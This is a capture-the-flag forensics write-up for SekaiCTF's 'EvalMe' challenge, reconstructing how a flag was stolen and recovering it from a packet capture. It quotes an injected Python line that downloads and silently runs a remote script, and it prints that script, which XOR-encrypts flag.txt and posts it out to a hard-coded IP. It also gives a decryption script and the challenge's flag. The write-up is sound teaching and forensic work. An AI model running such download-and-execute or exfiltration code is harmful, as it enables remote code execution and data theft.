# EvalMe - Forensics - SekaiCTF
## Author: Guesslemonger

### Problem
I was trying a beginner CTF challenge and successfully solved it. But it didn't give me the flag. Luckily I have this network capture. Can you investigate? It came attached with a `capture.pcapng`.

### Challenge Description
Connecting to the `chals.sekai.team` server required the user to solve 100 simple math problems under a given time. This was solved using the `evalMe.py` script.

Following its solve, there was a curl command given at the end:
```python
b'__import__("subprocess").check_output("(curl -sL https://shorturl.at/fgjvU -o extract.sh && chmod +x extract.sh && bash extract.sh && rm -f extract.sh)>/dev/null 2>&1||true",shell=True)\r#1 + 2
```

### Extract.sh
Downloading the extract.sh to our VM (`curl -sL https://shorturl.at/fgjvU -o extract.sh`), we get the following script:
```
#!/bin/bash

FLAG=$(cat flag.txt)

KEY='s3k@1_v3ry_w0w'

# Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46
Asc() { printf '%d' "'$1"; }

XOREncrypt(){
    local key="$1" DataIn="$2"
    local ptr DataOut val1 val2 val3

    for (( ptr=0; ptr < ${#DataIn}; ptr++ )); do

        val1=$( Asc "${DataIn:$ptr:1}" )
        val2=$( Asc "${key:$(( ptr % ${#key} )):1}" )

        val3=$(( val1 ^ val2 ))

        DataOut+=$(printf '%02x' "$val3")

    done

    for ((i=0;i<${#DataOut};i+=2)); do
    BYTE=${DataOut:$i:2}
    curl -m 0.5 -X POST -H "Content-Type: application/json" -d "{\"data\":\"$BYTE\"}" http://35.196.65.151:30899/ &>/dev/null
    done
}

XOREncrypt $KEY $FLAG

exit 0
```

### XOR Encryption
This script reads the content of `flag.txt`, encrypts it using XOR encryption with a predefined key, and then sends the encrypted data, byte by byte, to a remote server using cURL. The server URL and endpoint seem to be `http://35.196.65.151:30899/`, and the data is likely being sent in a structured JSON format as part of the POST request.

### pcap Analysis
This is where the pcap file comes in. It contains the data sent via that POST command. So, filtering by: `ip.dst ==35.196.65.151 && http.request.method == POST`, we get 51 packets that contain the bytes that were sent as seen below:


[![alt text]([https://github.com/triciadang/CTF/SekaiCTF/evalMe/evalMeScreenshot.jpg?raw=true])](https://github.com/triciadang/CTF/blob/main/SekaiCTF/evalMe/evalMeScreenshot.jpg)

We exported all of the bytes into a txt file using Wireshark.

### Decryption of the Data
We then created a script that reversed the encryption for each byte:

```
#!/bin/bash
KEY='s3k@1_v3ry_w0w'

Asc() {
    printf '%d' "'$1"
}

XORDecrypt() {
    local key="$1" DataIn="$2"
    local bytes=($DataIn)

    for (( i = 0; i < ${#bytes[@]}; i++ )); do
        val3=$(printf '%d' "0x${bytes[i]}")

        # Adjusted key indexing for both uppercase and lowercase characters
        val2=$( Asc "${key:$(( i % ${#key} )):1}" )

        val1=$(( val3 ^ val2 ))

        DataOut+=$(printf '\\x%02x' "$val1")
    done

    echo -ne "$DataOut"
}

EncryptedData=$(<encrypted.txt)
DecryptedData=$(XORDecrypt "$KEY" "$EncryptedData")

echo -ne "$DecryptedData"
```
Running it against the exported bytes, we retrieve the flag: `SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}`
